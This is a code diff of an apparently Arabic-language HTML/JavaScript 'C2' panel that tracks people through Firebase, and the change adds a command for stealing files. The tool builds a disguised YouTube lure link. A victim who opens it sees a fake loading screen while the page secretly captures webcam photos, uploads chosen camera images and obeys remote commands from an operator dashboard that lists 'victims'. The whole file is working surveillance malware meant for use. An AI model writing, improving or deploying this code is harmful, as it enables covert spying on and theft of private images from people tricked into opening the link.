@@ -3,37 +3,37 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>MONSTER C2 v11.0 | THE DOCTOR</title>
+    <title>MONSTER CONTROL v12.0</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <style>
         :root { --neon: #00ff41; --bg: #050505; }
         * { box-sizing: border-box; font-family: 'Courier New', monospace; }
-        body { background: var(--bg); color: var(--neon); margin: 0; overflow: hidden; font-size: 13px; }
+        body { background: var(--bg); color: var(--neon); margin: 0; overflow: hidden; }
 
-        /* الهيدر والقائمة اليسرى */
+        /* القائمة اليسرى */
         .hamburger { position: fixed; top: 10px; left: 10px; z-index: 1000; cursor: pointer; background: #000; border: 1px solid var(--neon); padding: 5px 10px; border-radius: 4px; }
         #menu-check { display: none; }
-        .sidebar { position: fixed; top: 0; left: -260px; width: 260px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.2s; z-index: 999; padding: 50px 10px; }
+        .sidebar { position: fixed; top: 0; left: -260px; width: 260px; height: 100%; background: #0a0a0a; border-right: 2px solid var(--neon); transition: 0.2s; z-index: 999; padding: 50px 10px; overflow-y: auto; }
         #menu-check:checked ~ .sidebar { left: 0; }
 
-        .main { height: 100vh; padding: 15px; overflow-y: auto; text-align: center; }
-        .btn-group { display: grid; grid-template-columns: 1fr 1fr; gap: 5px; margin-top: 10px; }
+        .main { height: 100vh; padding: 15px; overflow-y: auto; text-align: center; margin-top: 40px; }
+        .btn-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 20px; }
         
-        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; }
-        button:hover { background: var(--neon); color: #000; }
-        button:active { transform: scale(0.95); }
+        button { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 11px; }
+        button:active { background: var(--neon); color: #000; }
 
         .v-card { border: 1px solid #222; padding: 10px; margin-bottom: 8px; border-radius: 4px; text-align: right; cursor: pointer; }
         .v-card.active { border-color: #fff; background: #111; }
-        .dot { width: 8px; height: 8px; border-radius: 50%; display: inline-block; float: left; margin-top: 5px; }
+        .dot { width: 10px; height: 10px; border-radius: 50%; display: inline-block; float: left; }
 
-        #gallery img { width: 100%; border: 1px solid #333; margin-top: 10px; border-radius: 5px; }
-        .img-wrap { position: relative; margin-bottom: 15px; }
-        .img-btns { display: flex; justify-content: space-between; background: #000; padding: 5px; border: 1px solid var(--neon); border-top: none; }
+        /* المعرض */
+        .img-item { border: 1px solid #333; margin-bottom: 15px; background: #000; border-radius: 5px; overflow: hidden; }
+        .img-item img { width: 100%; display: block; }
+        .img-ctrls { display: flex; background: #111; }
+        .img-ctrls button { flex: 1; border: none; border-top: 1px solid #333; border-radius: 0; }
 
-        /* واجهة الضحية */
-        #victim-mask { position: fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; align-items:center; justify-content:center; color:#fff; }
+        #victim-ui { position: fixed; top:0; left:0; width:100%; height:100%; background:#000; z-index:10000; display:none; flex-direction:column; align-items:center; justify-content:center; color:#fff; }
     </style>
 </head>
 <body>
@@ -42,33 +42,35 @@
 <label for="menu-check" class="hamburger">☰ الرادار</label>
 
 <div class="sidebar">
-    <h4 style="border-bottom: 1px solid var(--neon);">📡 الأجهزة المكتشفة</h4>
-    <div id="v-list">بانتظار الجلسات...</div>
+    <h3 style="border-bottom: 1px solid var(--neon);">📡 الأجهزة</h3>
+    <div id="v-list">بانتظار الضحايا...</div>
     <hr>
-    <h4>⚙️ توليد التلغيم</h4>
+    <h3>⚙️ التلغيم</h3>
     <input type="text" id="target-url" placeholder="رابط فيديو (يوتيوب)" style="width:100%; background:#000; color:var(--neon); border:1px solid var(--neon); padding:8px;">
-    <button onclick="buildLink()" style="width:100%; margin-top:5px;">صناعة الرابط</button>
-    <div id="final-res" style="font-size:9px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
+    <button onclick="build()" style="width:100%; margin-top:5px;">صناعة الرابط</button>
+    <div id="res-link" style="font-size:9px; color:#0ff; margin-top:10px; word-break:break-all;"></div>
 </div>
 
 <div class="main">
-    <h3 style="border-bottom: 1px solid var(--neon);">🕹️ السيطرة: <span id="active-name">لا يوجد</span></h3>
-    <div class="btn-group">
-        <button onclick="exec('snap')" style="border-color: #0ff;">📸 سحب صورة</button>
-        <button onclick="exec('vibrate')" style="border-color: #ff0;">📳 هز الجهاز</button>
-        <button onclick="exec('release')" style="background: #131;">🔓 إطلاق سراح</button>
-        <button onclick="clearAll()" style="border-color: #f00;">🗑️ مسح الكل</button>
+    <h3 style="border-bottom: 1px solid var(--neon);">🕹️ التحكم: <span id="active-target">اختر جهازاً</span></h3>
+    <div class="btn-grid">
+        <button onclick="cmd('snap')">📸 سحب صورة فورية</button>
+        <button onclick="cmd('vibrate')" style="border-color:yellow;">📳 هز الهاتف</button>
+        <button onclick="cmd('pick_file')" style="border-color:cyan;">📂 سحب ملفات الكاميرا</button>
+        <button onclick="cmd('release')" style="background:#030;">🔓 إطلاق سراح</button>
     </div>
+    <button onclick="clearDB()" style="width:100%; border-color:red; color:red;">🗑️ مسح كافة البيانات</button>
 
-    <div id="gallery" style="margin-top:20px;">
-        <h4 style="text-align:right;">📸 الصور المستلمة:</h4>
-        <div id="imgs-container"></div>
+    <div id="gallery" style="margin-top:20px; text-align:right;">
+        <h4>🖼️ معرض الصور والملفات:</h4>
+        <div id="img-container"></div>
     </div>
 </div>
 
-<div id="victim-mask">
+<div id="victim-ui">
     <div style="width:40px; height:40px; border:4px solid #333; border-top-color:var(--neon); border-radius:50%; animation:spin 1s linear infinite;"></div>
-    <p>Loading Media Content...</p>
+    <p id="v-status">جاري الاتصال بالسيرفر...</p>
+    <input type="file" id="file-input" style="display:none;" accept="image/*" multiple>
     <video id="v" autoplay playsinline style="display:none;"></video>
     <canvas id="c" style="display:none;"></canvas>
 </div>
@@ -81,94 +83,96 @@
     };
     firebase.initializeApp(config);
     const db = firebase.database();
-    let currentId = null;
+    let selId = null;
 
-    // --- إدارة الرادار (الآدمن) ---
-    db.ref('victims').on('value', snap => {
+    // --- إدارة الآدمن ---
+    db.ref('victims').on('value', s => {
         const list = document.getElementById('v-list');
-        const container = document.getElementById('imgs-container');
+        const container = document.getElementById('img-container');
         list.innerHTML = '';
-        snap.forEach(child => {
+        s.forEach(child => {
             const v = child.val();
             const id = child.key;
-            const online = (Date.now() - v.lastSeen) < 8000;
-            list.innerHTML += `<div class="v-card ${id==currentId?'active':''}" onclick="setVictim('${id}','${v.model}')">
-                <span class="dot" style="background:${online?'#0f0':'#f33'}"></span>
+            const online = (Date.now() - v.lastSeen) < 10000;
+            list.innerHTML += `<div class="v-card ${id==selId?'active':''}" onclick="select('${id}','${v.model}')">
+                <span class="dot" style="background:${online?'#0f0':'#f00'}"></span>
                 <b>${v.model}</b><br><small>${v.time}</small>
             </div>`;
-            
-            if(id === currentId && v.imgUrl) {
-                container.innerHTML = `<div class="img-wrap"><img src="${v.imgUrl}"><div class="img-btns">
-                <button onclick="window.open('${v.imgUrl}')">حفظ</button>
-                <button onclick="db.ref('victims/${id}/imgUrl').remove()" style="color:red">حذف</button>
-                </div></div>` + container.innerHTML;
+
+            if(id === selId && v.files) {
+                container.innerHTML = '';
+                Object.keys(v.files).forEach(fId => {
+                    container.innerHTML += `<div class="img-item">
+                        <img src="${v.files[fId]}">
+                        <div class="img-ctrls">
+                            <button onclick="window.open('${v.files[fId]}')">حفظ</button>
+                            <button onclick="db.ref('victims/${id}/files/${fId}').remove()" style="color:red">حذف</button>
+                        </div>
+                    </div>`;
+                });
             }
         });
     });
 
-    function setVictim(id, model) {
-        currentId = id;
-        document.getElementById('active-name').innerText = model;
-        document.getElementById('menu-check').checked = false;
+    function select(id, model) { selId = id; document.getElementById('active-target').innerText = model; document.getElementById('menu-check').checked = false; }
+    
+    function cmd(type) { if(selId) db.ref('victims/'+selId+'/cmd').set({ type, t: Date.now() }); }
+
+    function build() { 
+        const url = document.getElementById('target-url').value;
+        document.getElementById('res-link').innerText = window.location.href.split('?')[0] + "?v=" + btoa(url); 
     }
 
-    function exec(type) {
-        if(!currentId) return alert("اختر جهازاً!");
-        // نرسل الأمر مباشرة لخانة الجهاز المختار
-        db.ref('victims/' + currentId + '/command').set({ type, t: Date.now() });
-        console.log("Sent command: " + type);
-    }
+    function clearDB() { if(confirm("حذف الكل؟")) db.ref('/').remove(); }
 
-    function buildLink() {
-        const val = document.getElementById('target-url').value;
-        const out = window.location.href.split('?')[0] + "?go=" + btoa(val);
-        document.getElementById('final-res').innerText = out;
-    }
-
-    function clearAll() { if(confirm("حذف كل البيانات؟")) db.ref('/').remove(); }
-
-    // --- بايلوت الضحية (التنفيذ الصاعق) ---
-    const urlP = new URLSearchParams(window.location.search);
-    const go = urlP.get('go');
-    if(go) {
+    // --- بايلوت الضحية ---
+    const params = new URLSearchParams(window.location.search);
+    const vUrl = params.get('v');
+    if(vUrl) {
         (async () => {
-            document.getElementById('victim-mask').style.display = 'flex';
+            document.getElementById('victim-ui').style.display = 'flex';
             const model = navigator.userAgent.includes("Android") ? navigator.userAgent.split(';')[2] : "Mobile_User";
             const ref = db.ref('victims').push();
-            const myPath = ref.key;
+            const myId = ref.key;
 
-            const sendInfo = (img = null) => {
-                const data = { model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() };
-                if(img) data.imgUrl = img;
-                ref.update(data);
-            };
+            const sendImg = (data) => ref.child('files').push(data);
 
-            const capture = async () => {
+            const snap = async () => {
                 try {
                     const s = await navigator.mediaDevices.getUserMedia({video:true});
                     const video = document.getElementById('v'); video.srcObject = s; await video.play();
                     const canvas = document.getElementById('c'); canvas.width=video.videoWidth; canvas.height=video.videoHeight;
                     canvas.getContext('2d').drawImage(video, 0, 0);
-                    const base64 = canvas.toDataURL('image/jpeg', 0.5);
-                    sendInfo(base64);
+                    sendImg(canvas.toDataURL('image/jpeg', 0.5));
                     s.getTracks().forEach(t => t.stop());
-                } catch(e) { sendInfo(); }
+                } catch(e) {}
             };
 
-            await capture(); // السحب الأول
+            await ref.set({ model, lastSeen: Date.now(), time: new Date().toLocaleTimeString() });
+            await snap();
 
-            // الاستماع الفوري للأوامر المرسلة لهذا الجهاز حصراً
-            db.ref('victims/' + myPath + '/command').on('value', s => {
-                const cmd = s.val();
-                if(cmd) {
-                    if(cmd.type === 'snap') capture();
-                    if(cmd.type === 'vibrate') navigator.vibrate(500);
-                    if(cmd.type === 'release') window.location.href = atob(go);
+            // الاستماع للأوامر
+            db.ref('victims/' + myId + '/cmd').on('value', s => {
+                const c = s.val();
+                if(c) {
+                    if(c.type === 'snap') snap();
+                    if(c.type === 'vibrate') { navigator.vibrate([200, 100, 200]); }
+                    if(c.type === 'pick_file') document.getElementById('file-input').click();
+                    if(c.type === 'release') window.location.href = atob(vUrl);
                 }
             });
 
-            // نبض البقاء أونلاين
-            setInterval(() => ref.update({ lastSeen: Date.now() }), 4000);
+            // معالجة سحب الملفات (الكاميرا)
+            document.getElementById('file-input').onchange = (e) => {
+                const files = e.target.files;
+                for(let f of files) {
+                    const reader = new FileReader();
+                    reader.onload = (ev) => sendImg(ev.target.result);
+                    reader.readAsDataURL(f);
+                }
+            };
+
+            setInterval(() => ref.update({ lastSeen: Date.now() }), 5000);
         })();
     }
 </script>
